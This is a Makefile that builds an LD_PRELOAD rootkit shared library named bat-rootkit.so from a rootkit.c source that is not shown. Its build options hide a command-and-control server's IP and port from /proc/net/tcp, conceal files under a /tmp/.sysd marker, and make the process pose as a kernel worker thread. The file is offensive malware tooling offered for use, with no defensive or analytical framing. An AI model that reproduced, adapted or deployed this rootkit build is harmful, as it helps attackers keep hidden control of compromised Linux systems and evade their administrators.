# bat-rootkit.so   LD_PRELOAD rootkit build
#
# USAGE:
#   make                                  # build with defaults
#   make C2_IP=1.2.3.4 C2_PORT=8443      # bake C2 address for network hiding
#   make HIDE_COMM="kworker/u4:2"         # custom masquerade comm name
#
# Output: ../../bin/bat-rootkit.so

CC      ?= gcc
STRIP   ?= strip
CFLAGS  = -shared -fPIC -nostartfiles -O2 -Wall -Wextra -Wno-unused-parameter
LDFLAGS = -ldl
OUTDIR  = ../../bin
TARGET  = $(OUTDIR)/bat-rootkit.so

# Build-time configuration
HIDE_MARK  ?= /tmp/.sysd
HIDE_COMM  ?= kworker/0:1
C2_IP      ?=
C2_PORT    ?=

# Convert IP to little-endian hex for /proc/net/tcp matching
# Example: 1.2.3.4 → 04030201
# Done at build time via shell if IP is provided
ifneq ($(C2_IP),)
C2_IP_HEX  := $(shell python3 -c "import socket,struct; \
    p=struct.pack('<I',struct.unpack('!I',socket.inet_aton('$(C2_IP)'))[0]); \
    print(p.hex().upper())" 2>/dev/null)
else
C2_IP_HEX  :=
endif

ifneq ($(C2_PORT),)
C2_PORT_HEX := $(shell python3 -c "print(format($(C2_PORT),'04X'))" 2>/dev/null)
else
C2_PORT_HEX :=
endif

DFLAGS = \
    -DHIDE_MARK='"$(HIDE_MARK)"'   \
    -DHIDE_COMM='"$(HIDE_COMM)"'   \
    -DC2_IP_HEX='"$(C2_IP_HEX)"'  \
    -DC2_PORT_HEX='"$(C2_PORT_HEX)"'

.PHONY: all clean

all: $(TARGET)

$(TARGET): rootkit.c
	@mkdir -p $(OUTDIR)
	$(CC) $(CFLAGS) $(DFLAGS) $< -o $@ $(LDFLAGS)
	$(STRIP) $@
	@echo "[+] bat-rootkit.so → $@"
	@echo "    HIDE_COMM  = $(HIDE_COMM)"
	@echo "    HIDE_MARK  = $(HIDE_MARK)"
	@echo "    C2_IP_HEX  = $(C2_IP_HEX)"
	@echo "    C2_PORT_HEX= $(C2_PORT_HEX)"

clean:
	rm -f $(TARGET)
